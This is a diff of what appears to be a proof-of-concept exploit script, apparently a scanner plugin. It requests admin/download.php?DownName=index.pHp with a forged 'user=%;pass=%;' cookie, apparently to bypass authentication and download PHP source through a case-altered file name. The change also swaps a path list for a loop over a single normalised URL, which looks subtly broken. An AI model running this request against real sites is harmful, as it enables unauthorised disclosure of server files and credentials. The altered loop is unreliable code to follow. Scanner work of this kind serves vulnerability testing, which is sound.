@@ -25,14 +25,9 @@ class POC(Script):
             headers = {
                 "User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.4 (KHTML, like Gecko) Chrome/6.0.481.0 Safari/534.4",
                 "Cookie": "user=%;pass=%;"
-                       }
-            path_list = list(set([
-                self.url_normpath(self.base_url, '/'),
-                self.url_normpath(self.url, './'),
-            ]))
+            }
             async with ClientSession() as session:
-
-                for path in path_list:
+                for path in self.url_normpath(self.url, './'):
                     poc = "index.php"
                     url = path +"admin/download.php?DownName=%s" % poc.replace("h","H")
                     async with session.get(url=url, headers = headers) as res:
